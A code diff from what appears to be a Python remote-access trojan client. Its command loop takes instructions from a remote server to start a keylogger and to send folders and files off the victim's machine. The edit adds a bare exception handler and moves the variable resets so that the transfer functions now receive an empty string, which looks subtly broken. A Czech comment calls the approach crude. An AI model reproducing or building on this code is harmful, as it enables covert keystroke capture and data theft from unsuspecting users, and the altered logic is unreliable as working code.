@@ -21,28 +21,34 @@ while True:
             print(f"3: accepted {addr}")
             with conn:
                 while True:
-                    data = conn.recv(64).decode("utf-8") 
+                    try:
+                        data = conn.recv(64).decode("utf-8") 
+                    except: 
+                        print("Server disconnected attempting reconnection.")
+                        break
                     # The command section:
                     if data:
                         match data:
                             case "run -keylogger":
+                                data = ""
                                 print("Client Started the keylogger.")
                                 print("Command: ", {data})
                                 keylogger.start_keylogger()
-                                data = ""
 
                             # To je kokotské implementovanie, ale nemusím 500 if dávať
                             case data if "run -gf" == data:
+                                data = ""
                                 print("Client Started the Folder Transfer.")
                                 print("Command: ", {data})
                                 userscanner.start_FolderData(data)
-                                data = ""
+                                
 
                             case data if "run -gfc" in data:
+                                data = ""
                                 print("Client Started the FileTransfer.")
                                 print("Command: ", {data})
                                 userscanner.start_sendFiles(data)
-                                data = ""
+                                
 
 
        
